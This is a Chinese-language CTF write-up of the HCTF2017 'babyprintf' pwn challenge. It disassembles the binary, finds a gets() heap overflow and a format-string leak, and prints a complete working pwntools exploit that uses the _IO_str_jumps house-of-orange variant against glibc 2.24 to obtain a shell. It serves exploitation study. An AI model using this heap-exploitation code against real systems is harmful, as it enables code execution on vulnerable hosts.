---
layout: post
title: pwn HCTF2017 babyprintf
category: CTF
tags: ctf
keywords: ctf, binary, hack
description:
---

- [题目复现](#题目复现)
- [题目解析](#题目解析)
- [漏洞利用](#漏洞利用)
- [参考资料](#参考资料)


## 题目复现
```
$ file babyprintf 
babyprintf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5652f65b98094d8ab456eb0a54d37d9b09b4f3f6, stripped
$ checksec -f babyprintf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     1               2       babyprintf
$ strings libc-2.24.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release version 2.24, by Roland McGrath et al.
Compiled by GNU CC version 6.3.0 20170406.
```
64 位程序，开启了 canary 和 NX，默认开启 ASLR。

在 Ubuntu16.10 上玩一下：
```
./babyprintf
size: 0
string: AAAA
result: AAAAsize: 10
string: %p.%p.%p.%p
result: 0x7ffff7dd4720.(nil).0x7ffff7fb7500.0x7ffff7dd4720size: -1
too long
```
真是个神奇的 "printf" 实现。首先 size 的值对 string 的输入似乎并没有什么影响；然后似乎是直接打印 string，而没有考虑格式化字符串的问题；最后程序应该是对 size 做了大小上的检查，而且是无符号数。


## 题目解析
#### main
```
[0x00400850]> pdf @ main
            ;-- section..text:
/ (fcn) main 130
|   main ();
|           ; DATA XREF from 0x0040086d (entry0)
|           0x004007c0      push rbx                                   ; [14] -r-x section size 706 named .text
|           0x004007c1      xor eax, eax
|           0x004007c3      call sub.setbuf_950                        ; void setbuf(FILE *stream,
|       ,=< 0x004007c8      jmp 0x400815
        |   0x004007ca      nop word [rax + rax]
|       |   ; CODE XREF from 0x00400832 (main)
|      .--> 0x004007d0      mov edi, eax
|      :|   0x004007d2      call sym.imp.malloc                         ; rax = malloc(size) 分配堆空间
|      :|   0x004007d7      mov esi, str.string:                       ; 0x400aa4 ; "string: "
|      :|   0x004007dc      mov rbx, rax
|      :|   0x004007df      mov edi, 1
|      :|   0x004007e4      xor eax, eax
|      :|   0x004007e6      call sym.imp.__printf_chk
|      :|   0x004007eb      mov rdi, rbx                                ; rdi = rbx == rax
|      :|   0x004007ee      xor eax, eax
|      :|   0x004007f0      call sym.imp.gets                           ; 调用 gets 读入字符串
|      :|   0x004007f5      mov esi, str.result:                       ; 0x400aad ; "result: "
|      :|   0x004007fa      mov edi, 1
|      :|   0x004007ff      xor eax, eax
|      :|   0x00400801      call sym.imp.__printf_chk
|      :|   0x00400806      mov rsi, rbx                                ; rsi = rbx == rax
|      :|   0x00400809      mov edi, 1
|      :|   0x0040080e      xor eax, eax
|      :|   0x00400810      call sym.imp.__printf_chk                   ; 调用 __printf_chk 打印字符串
|      :|   ; CODE XREF from 0x004007c8 (main)
|      :`-> 0x00400815      mov esi, str.size:                         ; 0x400a94 ; "size: "
|      :    0x0040081a      mov edi, 1
|      :    0x0040081f      xor eax, eax
|      :    0x00400821      call sym.imp.__printf_chk
|      :    0x00400826      xor eax, eax
|      :    0x00400828      call sub._IO_getc_990                       ; 读入 size
|      :    0x0040082d      cmp eax, 0x1000
|      `==< 0x00400832      jbe 0x4007d0                                ; size 小于等于 0x1000 时跳转
|           0x00400834      mov edi, str.too_long                      ; 0x400a9b ; "too long"
|           0x00400839      call sym.imp.puts                          ; int puts(const char *s)
|           0x0040083e      mov edi, 1
\           0x00400843      call sym.imp.exit                          ; void exit(int status)
```
整个程序非常简单，首先分配 size 大小的空间，然后在这里读入字符串，由于使用 `gets()` 函数，可能会导致堆溢出。然后直接调用 `__printf_chk()` 打印这个字符串，可能会导致栈信息泄露。

这里需要注意的是 `__printf_chk()` 函数，由于程序开启了 `FORTIFY` 机制，所以程序在编译时所有的 `printf()` 都被 `__printf_chk()` 替换掉了。区别有两点：
- 不能使用 `%x$n` 不连续地打印，也就是说如果要使用 `%3$n`，则必须同时使用 `%1$n` 和 `%2$n`。
- 在使用 `%n` 的时候会做一些检查。


## 漏洞利用
所以这题应该不止是利用格式化字符串，其实是 house-of-orange 的升级版。由于 libc-2.24 中加入了对 vtable 指针的检查，原先的 house-of-arange 已经不可用了。然后新的利用技术又出现了，即一个叫做 `_IO_str_jumps` 的 vtable 里的 `_IO_str_overflow` 虚表函数（参考章节 4.13）。

#### overwrite top chunk
```python
def overwrite_top():
    payload  = "A" * 16
    payload += p64(0) + p64(0xfe1)              # top chunk header
    prf(0x10, payload)
```
为了能将 top chunk 释放到 unrosted bin 中，首先覆写 top chunk 的 size 字段：
```
gdb-peda$ x/8gx 0x602010-0x10
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x0000000000000000	0x0000000000000fe1      <-- top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```

#### leak libc
```python
def leak_libc():
    global libc_base

    prf(0x1000, '%p%p%p%p%p%pA')                # _int_free in sysmalloc
    libc_start_main = int(io.recvuntil("A", drop=True)[-12:], 16) - 241
    libc_base = libc_start_main - libc.symbols['__libc_start_main']

    log.info("libc_base address: 0x%x" % libc_base)
```
然后利用格式化字符串来泄露 libc 的地址，此时的 top chunk 也已经放到 unsorted bin 中了：
```
gdb-peda$ x/10gx 0x602010-0x10
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x0000000000000000	0x0000000000000fc1      <-- old top chunk
0x602030:	0x00007ffff7dd1b58	0x00007ffff7dd1b58
0x602040:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/6gx 0x623010-0x10
0x623000:	0x0000000000000000	0x0000000000001011
0x623010:	0x7025702570257025	0x0000004170257025      <-- format string
0x623020:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/4gx 0x623000+0x1010
0x624010:	0x0000000000000000	0x0000000000020ff1      <-- new top chunk
0x624020:	0x0000000000000000	0x0000000000000000
```

#### house of orange
```python
def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
    vtable_addr = libc_base + 0x3be4c0          # _IO_str_jumps

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("/bin/sh address: 0x%x" % bin_sh_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = p64(0) + p64(0x61)                # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream += p64(0)                            # fp->_IO_write_base
    stream += p64(0xffffffff)                   # fp->_IO_write_ptr
    stream += p64(0) *2                         # fp->_IO_write_end, fp->_IO_buf_base
    stream += p64((bin_sh_addr - 100) / 2)      # fp->_IO_buf_end
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(0)                            # fp->_mode

    payload  = "A" * 0x10
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)                 # _IO_FILE_plus->vtable
    payload += p64(system_addr)
    prf(0x10, payload)
```
改进版的 house-of-orange，详细你已经看了参考章节，这里就不再重复了，内存布局如下：
```
gdb-peda$ x/40gx 0x602010-0x10
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x0000000000000000	0x0000000000000021
0x602030:	0x4141414141414141	0x4141414141414141
0x602040:	0x0000000000000000	0x0000000000000061      <-- _IO_FILE_plus
0x602050:	0x0000000000000000	0x00007ffff7dd24f0
0x602060:	0x0000000000000000	0x7fffffffffffffff
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x00003ffffbdcd5ee	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000000000
0x6020e0:	0x0000000000000000	0x0000000000000000
0x6020f0:	0x0000000000000000	0x0000000000000000
0x602100:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x00007ffff7dce4c0      <-- vtable 
0x602120:	0x00007ffff7a556a0	0x0000000000000000      <-- system
0x602130:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/gx 0x00007ffff7dce4c0 + 0x18
0x7ffff7dce4d8:	0x00007ffff7a8f2b0                              <-- __overflow
```

#### pwn
```python
def pwn():
    io.sendline("0")        # abort routine
    io.interactive()
```
最后触发异常处理，`malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow`，获得 shell。

开启 ASLR，Bingo!!!
```
$ python exp.py
[+] Starting local process './babyprintf': pid 8307
[*] libc_base address: 0x7f40dc2ca000
[*] _IO_list_all address: 0x7f40dc68c500
[*] system address: 0x7f40dc30f6a0
[*] /bin/sh address: 0x7f40dc454c40
[*] vtable address: 0x7f40dc6884c0
[*] Switching to interactive mode
result: AAAAAAAAAAAAAAAAsize: *** Error in `./babyprintf': malloc(): memory corruption: 0x00007f40dc68c500 ***
======= Backtrace: =========
...
$ whoami
firmy
```

#### exploit
完整 exp 如下：
```python
#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./babyprintf'], env={'LD_PRELOAD':'./libc-2.24.so'})
libc = ELF('libc-2.24.so')

def prf(size, string):
    io.sendlineafter("size: ", str(size))
    io.sendlineafter("string: ", string)

def overwrite_top():
    payload  = "A" * 16
    payload += p64(0) + p64(0xfe1)              # top chunk header
    prf(0x10, payload)

def leak_libc():
    global libc_base

    prf(0x1000, '%p%p%p%p%p%pA')                # _int_free in sysmalloc
    libc_start_main = int(io.recvuntil("A", drop=True)[-12:], 16) - 241
    libc_base = libc_start_main - libc.symbols['__libc_start_main']

    log.info("libc_base address: 0x%x" % libc_base)

def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
    vtable_addr = libc_base + 0x3be4c0          # _IO_str_jumps

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("/bin/sh address: 0x%x" % bin_sh_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = p64(0) + p64(0x61)                # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream += p64(0)                            # fp->_IO_write_base
    stream += p64(0xffffffff)                   # fp->_IO_write_ptr
    stream += p64(0) *2                         # fp->_IO_write_end, fp->_IO_buf_base
    stream += p64((bin_sh_addr - 100) / 2)      # fp->_IO_buf_end
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(0)                            # fp->_mode

    payload  = "A" * 0x10
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)                 # _IO_FILE_plus->vtable
    payload += p64(system_addr)
    prf(0x10, payload)

def pwn():
    io.sendline("0")        # abort routine
    io.interactive()

if __name__ == '__main__':
    overwrite_top()
    leak_libc()
    house_of_orange()
    pwn()
```


## 参考资料
- https://github.com/spineee/hctf/tree/master/2017/babyprintf
